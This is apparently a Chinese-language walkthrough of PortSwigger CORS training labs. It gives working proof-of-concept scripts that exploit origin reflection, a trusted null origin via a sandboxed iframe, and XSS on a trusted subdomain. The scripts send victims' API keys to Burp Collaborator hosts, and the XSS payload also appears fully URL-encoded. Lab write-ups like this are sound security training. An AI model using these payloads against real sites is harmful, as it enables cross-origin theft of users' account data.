[TOC]

#### 0. [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)

#### 1. CORS vulnerability with basic origin reflection

```html
<script>
    fetch('/accountDetails', {credentials:'include'})
        .then(r => r.json())
        .then(j => document.getElementById('apikey').innerText = j.apikey)
</script>
```

可以看到这里的apikey是从`/accountDetails`请求到的，而且这里任何请求源都是可以的。

POC:

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac791f261ef0458680a600fa00bb00c5.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location = 'https://d5j3pam6uqnw0w6b9kg06xf5vw1mpb.burpcollaborator.net/?key=' + this.responseText;
};
</script>
```

这里去请求，然后将得到的key发送给burp collaborator。

#### 2. CORS vulnerability with trusted null origin

> The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:
>
> - Cross-site redirects.
> - Requests from serialized data.
> - Request using the `file:` protocol.
> - Sandboxed cross-origin requests.
>
>  An attacker can use various tricks to generate a cross-domain request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed `iframe` cross-origin request of the form:
>
> ```html
> <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
> var req = new XMLHttpRequest();
> req.onload = reqListener;
> req.open('get','vulnerable-website.com/sensitive-victim-data',true);
> req.withCredentials = true;
> req.send();
> 
> function reqListener() {
> location='malicious-website.com/log?key='+this.responseText;
> };
> </script>"></iframe>
> ```

题目这里也是信任`Origin: null`。我们用上述的沙盒来使得origin为空。

这道题也是从`/accountDetails`处获取的key。

POC：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://aca51f131e41e79c801a033f00ad0082.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://b6inmflbyq9n6ibgqp4fa4s8wz2pqe.burpcollaborator.net?key='+this.responseText;
};
</script>"></iframe>
```

#### 3. CORS vulnerability with trusted insecure protocols

> an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:
>
> - The victim user makes any plain HTTP request.
> - The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`
> - The victim's browser follows the redirect.
> - The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`
> - The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`
> - The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
> - The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

按照这个教程来看的话，解题顺序就是下面这样

* 找到一个包含了XSS漏洞的信任网站。

    找了半天只发现了这个网站：`http://stock.ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/?productId=1&storeId=1`

    其他网站也没有发现XSS漏洞，反而这个网站发现了XSS漏洞。

    `http://stock.ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/?productId=1<script>alert(1)</script>&storeId=1`

* 构造漏洞语句。

    ```html
    <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    
    function reqListener() {
    location='https://nd45l3xfse55vo9bqxkngzcwknqde2.burpcollaborator.net?key='+this.responseText;
    };
    </script>
    ```

    最好要删除所有的回车以及进行url编码。

    ```html
    <script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://nd45l3xfse55vo9bqxkngzcwknqde2.burpcollaborator.net?key='+this.responseText;};</script>
    
    %3c%73%63%72%69%70%74%3e%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%61%63%32%66%31%66%38%63%31%65%31%35%34%36%63%31%38%30%64%62%35%35%34%61%30%30%63%34%30%30%61%33%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%72%65%71%2e%73%65%6e%64%28%29%3b%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%6e%64%34%35%6c%33%78%66%73%65%35%35%76%6f%39%62%71%78%6b%6e%67%7a%63%77%6b%6e%71%64%65%32%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%7d%3b%3c%2f%73%63%72%69%70%74%3e
    ```

* 构建漏洞网页，并且构造直接访问漏洞页面的script。

    ```html
    <script> document.location = "http://stock.ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/?productId=1%3c%73%63%72%69%70%74%3e%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%61%63%32%66%31%66%38%63%31%65%31%35%34%36%63%31%38%30%64%62%35%35%34%61%30%30%63%34%30%30%61%33%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%72%65%71%2e%73%65%6e%64%28%29%3b%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%6e%64%34%35%6c%33%78%66%73%65%35%35%76%6f%39%62%71%78%6b%6e%67%7a%63%77%6b%6e%71%64%65%32%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%7d%3b%3c%2f%73%63%72%69%70%74%3e&storeId=1";</script>
    ```

* 接下来就是复制到exploit server里面，然后发送出去。

#### 4. CORS vulnerability with internal network pivot attack

